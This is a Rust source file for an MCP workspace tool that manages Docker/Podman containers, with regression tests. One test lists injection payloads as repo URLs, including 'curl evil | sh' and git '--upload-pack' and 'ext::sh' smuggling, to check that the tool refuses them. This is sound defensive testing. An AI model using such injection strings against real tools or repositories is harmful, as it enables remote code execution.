use crate::clone::clone_args;
use crate::{Result, WorkspaceError};
use arkavo_mcp::{Tool, ToolSchema};
use arkavo_process_env::ChildEnv;
use async_trait::async_trait;
use serde_json::{Value, json};
use std::process::Stdio;
use tokio::io::AsyncReadExt;
use tokio::process::Command;

/// The container runtime under the tool environment: `docker`/`podman`
/// need none of the agent's provider keys, and nothing they start may
/// inherit them.
fn runtime_command(runtime: &str) -> std::process::Command {
    ChildEnv::tool_from_current(&[]).command(runtime)
}

pub struct WorkspaceTool {
    schema: ToolSchema,
}

impl WorkspaceTool {
    pub fn new() -> Self {
        // No container-runtime probe here: the workspace tool is registered on
        // every run, but most sessions never touch it. Surfacing the missing
        // runtime is deferred to actual use (`create_workspace` returns a typed
        // `ContainerRuntime` error), so we don't spam unrelated runs.
        Self {
            schema: ToolSchema {
                name: "workspace_container".to_string(),
                aliases: None,
                description:
                    "Create and manage ephemeral containerized workspaces with resource quotas"
                        .to_string(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["create", "execute", "cleanup", "list"],
                            "description": "Workspace action to perform"
                        },
                        "workspace_id": {
                            "type": "string",
                            "description": "Unique workspace identifier"
                        },
                        "image": {
                            "type": "string",
                            "description": "Container image (default: ubuntu:22.04)"
                        },
                        "repo_url": {
                            "type": "string",
                            "description": "Git repository URL to clone: https://, ssh://, git:// or scp-style user@host:path"
                        },
                        "command": {
                            "type": "string",
                            "description": "Command to execute in workspace"
                        },
                        "cpu_limit": {
                            "type": "string",
                            "description": "CPU limit (e.g., '1.0' for 1 CPU)"
                        },
                        "memory_limit": {
                            "type": "string",
                            "description": "Memory limit (e.g., '512m', '1g')"
                        },
                        "timeout": {
                            "type": "integer",
                            "description": "Execution timeout in seconds (default: 300)"
                        },
                        "network": {
                            "type": "boolean",
                            "description": "Enable network access (default: false)"
                        },
                        "env": {
                            "type": "object",
                            "description": "Environment variables"
                        }
                    },
                    "required": ["action"]
                }),
            },
        }
    }

    fn detect_runtime() -> Result<String> {
        if runtime_command("docker")
            .arg("--version")
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
        {
            return Ok("docker".to_string());
        }

        if runtime_command("podman")
            .arg("--version")
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
        {
            return Ok("podman".to_string());
        }

        Err(WorkspaceError::ContainerRuntime(
            "Neither Docker nor Podman found".to_string(),
        ))
    }

    async fn create_workspace(&self, params: &Value) -> Result<String> {
        let workspace_id = params
            .get("workspace_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| WorkspaceError::InvalidParams("Missing workspace_id".to_string()))?;
        // Checked before anything runs, so a refused URL leaves no container.
        let clone = params
            .get("repo_url")
            .and_then(|v| v.as_str())
            .map(|url| clone_args(workspace_id, url))
            .transpose()?;
        let runtime = Self::detect_runtime()?;

        let image = params
            .get("image")
            .and_then(|v| v.as_str())
            .unwrap_or("ubuntu:22.04");

        let cpu_limit = params.get("cpu_limit").and_then(|v| v.as_str());
        let memory_limit = params.get("memory_limit").and_then(|v| v.as_str());
        let network = params
            .get("network")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        let mut cmd = Command::from(runtime_command(&runtime));
        cmd.arg("run")
            .arg("-d")
            .arg("--name")
            .arg(workspace_id)
            .arg("--rm");

        if let Some(cpu) = cpu_limit {
            cmd.arg("--cpus").arg(cpu);
        }

        if let Some(mem) = memory_limit {
            cmd.arg("--memory").arg(mem);
        }

        if !network {
            cmd.arg("--network").arg("none");
        }

        if let Some(env_vars) = params.get("env").and_then(|v| v.as_object()) {
            for (key, value) in env_vars {
                if let Some(val) = value.as_str() {
                    cmd.arg("-e").arg(format!("{}={}", key, val));
                }
            }
        }

        cmd.arg(image).arg("sleep").arg("infinity");

        cmd.stdout(Stdio::piped()).stderr(Stdio::piped());

        let mut child = cmd.spawn().map_err(|e| {
            WorkspaceError::CreationFailed(format!("Failed to spawn {runtime}: {e}"))
        })?;

        let mut stdout = String::new();
        let mut stderr = String::new();

        if let Some(mut stdout_stream) = child.stdout.take() {
            stdout_stream
                .read_to_string(&mut stdout)
                .await
                .map_err(WorkspaceError::Io)?;
        }

        if let Some(mut stderr_stream) = child.stderr.take() {
            stderr_stream
                .read_to_string(&mut stderr)
                .await
                .map_err(WorkspaceError::Io)?;
        }

        let status = child
            .wait()
            .await
            .map_err(|e| WorkspaceError::CreationFailed(format!("Wait failed: {e}")))?;

        if !status.success() {
            return Err(WorkspaceError::CreationFailed(format!(
                "Container creation failed: {stderr}"
            )));
        }

        if let Some(args) = clone {
            let output = Command::from(runtime_command(&runtime))
                .args(args)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .output()
                .await
                .map_err(|e| WorkspaceError::CreationFailed(format!("Git clone failed: {e}")))?;

            if !output.status.success() {
                let error = String::from_utf8_lossy(&output.stderr);
                return Err(WorkspaceError::CreationFailed(format!(
                    "Git clone failed: {error}"
                )));
            }
        }

        Ok(format!("Workspace {} created successfully", workspace_id))
    }

    async fn execute_command(&self, params: &Value) -> Result<String> {
        let runtime = Self::detect_runtime()?;
        let workspace_id = params
            .get("workspace_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| WorkspaceError::InvalidParams("Missing workspace_id".to_string()))?;

        let command = params
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| WorkspaceError::InvalidParams("Missing command".to_string()))?;

        let timeout = params
            .get("timeout")
            .and_then(|v| v.as_u64())
            .unwrap_or(300);

        let mut cmd = Command::from(runtime_command(&runtime));
        cmd.arg("exec")
            .arg(workspace_id)
            .arg("sh")
            .arg("-c")
            .arg(command)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());

        let mut child = cmd.spawn().map_err(|e| {
            WorkspaceError::ContainerRuntime(format!("Failed to execute command: {e}"))
        })?;

        let timeout_duration = tokio::time::Duration::from_secs(timeout);
        let result = tokio::time::timeout(timeout_duration, async {
            let mut stdout = String::new();
            let mut stderr = String::new();

            if let Some(mut stdout_stream) = child.stdout.take() {
                stdout_stream
                    .read_to_string(&mut stdout)
                    .await
                    .map_err(WorkspaceError::Io)?;
            }

            if let Some(mut stderr_stream) = child.stderr.take() {
                stderr_stream
                    .read_to_string(&mut stderr)
                    .await
                    .map_err(WorkspaceError::Io)?;
            }

            let status = child
                .wait()
                .await
                .map_err(|e| WorkspaceError::ContainerRuntime(format!("Wait failed: {e}")))?;

            Ok::<_, WorkspaceError>(json!({
                "stdout": stdout,
                "stderr": stderr,
                "exit_code": status.code().unwrap_or(-1)
            }))
        })
        .await;

        match result {
            Ok(output) => Ok(output?.to_string()),
            Err(_) => {
                child.kill().await.ok();
                Err(WorkspaceError::ResourceLimit(format!(
                    "Command execution timed out after {} seconds",
                    timeout
                )))
            }
        }
    }

    async fn cleanup_workspace(&self, params: &Value) -> Result<String> {
        let runtime = Self::detect_runtime()?;
        let workspace_id = params
            .get("workspace_id")
            .and_then(|v| v.as_str())
            .ok_or_else(|| WorkspaceError::InvalidParams("Missing workspace_id".to_string()))?;

        let output = Command::from(runtime_command(&runtime))
            .arg("rm")
            .arg("-f")
            .arg(workspace_id)
            .output()
            .await
            .map_err(|e| WorkspaceError::CleanupFailed(format!("Cleanup failed: {e}")))?;

        if !output.status.success() {
            let error = String::from_utf8_lossy(&output.stderr);
            return Err(WorkspaceError::CleanupFailed(error.to_string()));
        }

        Ok(format!("Workspace {} cleaned up", workspace_id))
    }

    async fn list_workspaces(&self) -> Result<String> {
        let runtime = Self::detect_runtime()?;

        let output = Command::from(runtime_command(&runtime))
            .arg("ps")
            .arg("--filter")
            .arg("name=arkavo-workspace-")
            .arg("--format")
            .arg("{{.Names}}")
            .output()
            .await
            .map_err(|e| {
                WorkspaceError::ContainerRuntime(format!("Failed to list workspaces: {e}"))
            })?;

        if !output.status.success() {
            let error = String::from_utf8_lossy(&output.stderr);
            return Err(WorkspaceError::ContainerRuntime(error.to_string()));
        }

        let workspaces = String::from_utf8_lossy(&output.stdout);
        Ok(workspaces.to_string())
    }

    async fn execute_workspace(&self, params: &Value) -> Result<String> {
        let action = params["action"]
            .as_str()
            .ok_or_else(|| WorkspaceError::InvalidParams("Missing action".to_string()))?;

        match action {
            "create" => self.create_workspace(params).await,
            "execute" => self.execute_command(params).await,
            "cleanup" => self.cleanup_workspace(params).await,
            "list" => self.list_workspaces().await,
            _ => Err(WorkspaceError::InvalidParams(format!(
                "Unknown action: {action}"
            ))),
        }
    }
}

impl Default for WorkspaceTool {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Tool for WorkspaceTool {
    async fn execute(
        &self,
        params: Value,
    ) -> std::result::Result<Value, Box<dyn std::error::Error + Send + Sync>> {
        let output = self
            .execute_workspace(&params)
            .await
            .map_err(|e| Box::new(e) as Box<dyn std::error::Error + Send + Sync>)?;

        Ok(json!({
            "success": true,
            "result": output
        }))
    }

    fn schema(&self) -> &ToolSchema {
        &self.schema
    }
}

#[cfg(test)]
#[allow(clippy::disallowed_methods)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_detect_runtime() {
        let result = WorkspaceTool::detect_runtime();
        assert!(result.is_ok() || result.is_err());
    }

    /// The URL is checked before the runtime is probed, so this holds whether
    /// or not docker is installed, and no container is left behind.
    #[arkavo_test_macros::spec("WORKSPACE-003")]
    #[tokio::test]
    async fn create_refuses_unsafe_repo_url_before_starting_a_container() {
        for repo_url in [
            "https://x/y; curl evil | sh",
            "--upload-pack=touch /tmp/pwned",
            "ext::sh -c touch% /tmp/pwned",
        ] {
            let err = WorkspaceTool::new()
                .create_workspace(&json!({ "workspace_id": "ws", "repo_url": repo_url }))
                .await
                .expect_err(repo_url);
            assert!(matches!(err, WorkspaceError::InvalidParams(_)), "{err}");
        }
    }

    /// Set only on the re-run test process; names the directory the probe
    /// works in.
    #[cfg(unix)]
    const PROBE_DIR: &str = "ARKAVO_WORKSPACE_ENV_PROBE_DIR";
    #[cfg(unix)]
    const PLANTED: &str = "planted-provider-key";

    /// The half of the regression test below that runs in the re-run
    /// process, whose real environment holds a planted provider key: a fake
    /// `docker` first on `PATH` records the environment the tool gave it.
    #[cfg(unix)]
    #[tokio::test]
    async fn docker_env_probe() {
        use std::os::unix::fs::PermissionsExt;
        let Some(dir) = std::env::var_os(PROBE_DIR).map(std::path::PathBuf::from) else {
            return;
        };
        // Written here, not in the parent test process, so no other test's
        // fork holds the file open when it is executed.
        let bin = dir.join("bin");
        std::fs::create_dir_all(&bin).expect("bin dir");
        let docker = bin.join("docker");
        // One dump per call: `list` first probes `--version`, then runs `ps`,
        // and each is a separate child that must be credential-free.
        let script = "#!/bin/sh\ncase \"$1\" in --version) env > docker-env-version.txt;; ps) env > docker-env-ps.txt;; esac\n";
        std::fs::write(&docker, script).expect("fake docker");
        std::fs::set_permissions(&docker, std::fs::Permissions::from_mode(0o755))
            .expect("make fake docker executable");
        WorkspaceTool::new()
            .execute(json!({ "action": "list" }))
            .await
            .expect("fake docker runs");
    }

    #[cfg(unix)]
    #[arkavo_test_macros::spec("MCP-016")]
    #[test]
    fn workspace_runtime_never_sees_a_planted_provider_key() {
        let dir = tempfile::TempDir::new().expect("temp dir");
        let path = std::env::join_paths(std::iter::once(dir.path().join("bin")).chain(
            std::env::split_paths(&std::env::var_os("PATH").unwrap_or_default()),
        ))
        .expect("PATH");
        let output = std::process::Command::new(std::env::current_exe().expect("test binary"))
            .args([
                "--exact",
                "workspace::tests::docker_env_probe",
                "--nocapture",
            ])
            .current_dir(dir.path())
            .env_remove(arkavo_process_env::TOOL_ENV_PASSTHROUGH)
            .env(PROBE_DIR, dir.path())
            .env("PATH", path)
            .env("OPENAI_API_KEY", PLANTED)
            .env("ARKAVO_PROBE_SETTING", "kept")
            .output()
            .expect("re-run test binary");
        let log = String::from_utf8_lossy(&output.stdout);
        assert!(
            output.status.success() && log.contains("1 passed"),
            "{log}{}",
            String::from_utf8_lossy(&output.stderr)
        );

        for call in ["version", "ps"] {
            let dump = dir.path().join(format!("docker-env-{call}.txt"));
            let seen = std::fs::read_to_string(dump).expect("docker ran");
            assert!(
                seen.lines().any(|l| l == "ARKAVO_PROBE_SETTING=kept"),
                "{call}: {seen}"
            );
            assert!(!seen.contains(PLANTED), "{call}: {seen}");
        }
    }
}
